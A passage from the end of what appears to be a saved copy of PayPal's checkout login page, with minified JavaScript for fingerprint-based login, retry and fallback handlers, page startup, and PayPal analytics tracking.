                                n.preventDefault(), fingerprint.utils.cancelUafOperation(a), t.showSpinner(), t.notYouClickHandler(n, function() {
                                    var t = [l, {
                                        evt: "transition_name",
                                        data: "process_fp_not_you",
                                        instrument: !0
                                    }];
                                    login.logger.clientLog(t, null), fingerprint.utils.deregisterUAFOperation(f), c(e)
                                })
                            })
                        }

                        function p() {
                            var e = document.querySelector(".fpLoginUsePasswordLink");
                            e && (e.onclick = function(n) {
                                n.preventDefault(), fingerprint.utils.cancelUafOperation(a), t.showSpinner();
                                var r = [l, {
                                    evt: "transition_name",
                                    data: "process_use_password_instead",
                                    instrument: !0
                                }];
                                login.logger.clientLog(r, function() {
                                    c(e)
                                })
                            })
                        }

                        function d(e) {
                            var t = e && e.uafProtocolMessage,
                                n = document.querySelectorAll("form[name=login] input[type=hidden]"),
                                r = login.utils.getKmliCb(),
                                i = ["login_email", "login_password", "login_phone", "login_pin"],
                                s = {};
                            t = JSON.parse(t), t || c(), s.uafResponse = JSON.stringify(t);
                            if (n.length)
                                for (var o = 0; o < n.length; o++)
                                    for (var u = 0; u < i.length; u++) n[o] && n[o].name !== i[u] && (s[n[o].name] = n[o].value);
                            r && r.checked && (s.rememberMe = "true"), fingerprint.utils.makeServiceRequest({
                                data: s
                            }, function(e) {
                                e.returnUrl ? window.location.href = e.returnUrl : c()
                            }, function() {
                                c()
                            })
                        }

                        function v(e) {
                            var i = document.querySelector(".fpLoginTryAgain"),
                                s = document.querySelector(".headerIconThumbprint");
                            if (e === r) return;
                            if (n > 0) {
                                n -= 1, t.showSpinner(), t.showSpinnerMessage("oneSecond");
                                var o = [l, {
                                    evt: "transition_name",
                                    data: "process_fp_login_retry",
                                    instrument: !0
                                }, {
                                    evt: "fp_login_error",
                                    data: e || "",
                                    instrument: !0
                                }];
                                return login.logger.clientLog(o, null), setTimeout(function() {
                                    t.hideSpinner(), t.hideSpinnerMessage("oneSecond"), s && (s.className = "headerIconThumbprintError"), i && $(i).removeClass("hide"), m()
                                }, 1e3)
                            }
                            c()
                        }

                        function m() {
                            navigator.uaf.processUAFOperation(u, d, v)
                        }

                        function g(e) {
                            e = e || {}, a = fingerprint.utils.getUafMessage(e.cancelUafRequest), f = fingerprint.utils.getUafMessage(e.deregUafRequest), e.uafRequest ? (u = fingerprint.utils.getUafMessage(e.uafRequest), t.hideSpinner(), fingerprint.utils.cancelUafOperation(a, function() {
                                setTimeout(m, 500)
                            })) : c()
                        }

                        function y() {
                            c()
                        }
                        var e = window.PAYPAL && window.PAYPAL.ulData || {},
                            t = login.utils,
                            n = 2,
                            r = 3,
                            i = document.querySelector(".fpLogin"),
                            s = document.querySelector(".footer"),
                            o = $("body").data("fpLoginError"),
                            u, a, f, l = {
                                evt: "state_name",
                                data: "begin_fp_login",
                                instrument: !0
                            };
                        e.fingerprintProceed === "login" && navigator.uaf && (h(), p(), fingerprint.utils.makeServiceRequest({
                            path: "/challenge/uaf"
                        }, g, y))
                    }, login.bootstrap = function() {
                        login.core(), login.oneTouch(), login.footer(), login.pwr(), login.ads.init(), login.fn.initialize(), login.checkoutIncontext && login.checkoutIncontext(), login.showHidePassword()
                    }, document.onreadystatechange = function() {
                        var e, t = login.utils.getSplitLoginContext();
                        document.readyState === "complete" && (login.bootstrap(), login.autosendEmail && login.autosendEmail.initialize(), e = window.PAYPAL && window.PAYPAL.ulData || {}, e.preloadScriptUrl && asyncLoadScriptUrls(e.preloadScriptUrl), t ? instrumentSplitLoginPageLoad(t) : instrumentUlAsLandingPageLoad(), addEvent(document, "click", login.utils.documentClickHandler), login.pubsub.subscribe("WINDOW_CLICK", login.utils.toggleRememberInfoTooltip), showReturnToMerchantLink(), e.fingerprintProceed === "lookup" && fingerprint && fingerprint.lookup(), e.fingerprintProceed === "login" && fingerprint && fingerprint.login())
                    }
                }();
        </script>
        <script src="https://www.paypalobjects.com/pa/js/min/pa.js"></script>
        <script>
            (function() {
                if (typeof PAYPAL.analytics != "undefined") {
                    PAYPAL.core = PAYPAL.core || {};
                    PAYPAL.core.pta = PAYPAL.analytics.setup({
                        data: 'pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&qual=&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2FcontextualLoginView%2Fcheckout.dust&pgst=1507198696270&lgin=&vers=&calc=804aa24f57fa9&rsta=en_US&pgtf=Nodejs&s=ci&ccpg=&csci=5c4265f67f7e4b5fbcb9dadaa56d76dc&comp=unifiedloginnodeweb&tsrce=unifiedloginnodeweb&pxpguid=&goal=&fltp=&flnm=&erpg=&erfd=&eccd=&cust=&acnt=&aver=&rstr=&pfid=&bztp=&mbtp=&transition_name=process_ul_browser_render&fltk=8YT3130912601921J&flid=8YT3130912601921J&fn_sync_enabled=Y&ctx_login_ot_content=0&obex=checkout&landing_page=login&state_name=LOGIN_UL_RM&ctx_login_content_fetch=success&ctx_login_ctxid_fetch=success%7Cparse-success&ctx_login_onetouch=shown&ctx_login_signup_btn=shown%7CcreateAccount&ctx_login_tag_line=shown%7CpayWithPayPal&ctx_login_intent=checkout&ctx_login_flow=Express%20checkout&ctx_login_state_transition=login_loaded',
                        url: 'https:\/\/t.paypal.com\/ts'
                    });
                    try {
                        var pageData = PAYPAL.analytics.Analytics.prototype.utils.queryStringToObject('pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&qual=&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2FcontextualLoginView%2Fcheckout.dust&pgst=1507198696270&lgin=&vers=&calc=804aa24f57fa9&rsta=en_US&pgtf=Nodejs&s=ci&ccpg=&csci=5c4265f67f7e4b5fbcb9dadaa56d76dc&comp=unifiedloginnodeweb&tsrce=unifiedloginnodeweb&pxpguid=&goal=&fltp=&flnm=&erpg=&erfd=&eccd=&cust=&acnt=&aver=&rstr=&pfid=&bztp=&mbtp=&transition_name=process_ul_browser_render&fltk=8YT3130912601921J&flid=8YT3130912601921J&fn_sync_enabled=Y&ctx_login_ot_content=0&obex=checkout&landing_page=login&state_name=LOGIN_UL_RM&ctx_login_content_fetch=success&ctx_login_ctxid_fetch=success%7Cparse-success&ctx_login_onetouch=shown&ctx_login_signup_btn=shown%7CcreateAccount&ctx_login_tag_line=shown%7CpayWithPayPal&ctx_login_intent=checkout&ctx_login_flow=Express%20checkout&ctx_login_state_transition=login_loaded');
                        PAYPAL.analytics.endCPLTracking({
                            inferStart: true,
                            pageData: pageData
                        });
                    } catch (e) {}
                }
            }());
        </script>
        <noscript>
            <img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&qual=&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2FcontextualLoginView%2Fcheckout.dust&pgst=1507198696270&lgin=&vers=&calc=804aa24f57fa9&rsta=en_US&pgtf=Nodejs&s=ci&ccpg=&csci=5c4265f67f7e4b5fbcb9dadaa56d76dc&comp=unifiedloginnodeweb&tsrce=unifiedloginnodeweb&pxpguid=&goal=&fltp=&flnm=&erpg=&erfd=&eccd=&cust=&acnt=&aver=&rstr=&pfid=&bztp=&mbtp=&transition_name=process_ul_browser_render&fltk=8YT3130912601921J&flid=8YT3130912601921J&fn_sync_enabled=Y&ctx_login_ot_content=0&obex=checkout&landing_page=login&state_name=LOGIN_UL_RM&ctx_login_content_fetch=success&ctx_login_ctxid_fetch=success%7Cparse-success&ctx_login_onetouch=shown&ctx_login_signup_btn=shown%7CcreateAccount&ctx_login_tag_line=shown%7CpayWithPayPal&ctx_login_intent=checkout&ctx_login_flow=Express%20checkout&ctx_login_state_transition=login_loaded"
                alt="" height="1" width="1" border="0">
        </noscript>
    </body>

    </html>